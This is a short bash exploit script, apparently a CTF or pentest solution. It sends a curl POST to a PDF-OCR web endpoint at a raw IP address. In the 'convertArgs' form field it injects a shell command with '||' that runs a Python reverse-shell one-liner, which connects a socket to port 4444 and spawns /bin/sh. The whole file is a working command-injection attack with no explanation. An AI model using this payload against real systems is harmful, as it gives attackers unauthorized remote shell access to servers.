#!/bin/bash

curl --request POST \
  --url 'http://188.166.250.209:12345/pdf_ocr?file=file' \
  --header 'content-type: multipart/form-data; boundary=---011000010111000001101001' \
  --form pdf= \
  --form convertArgs=asdasd \
  --form 'convertArgs=|| python -c '\''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("localhost",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\''; # ,'
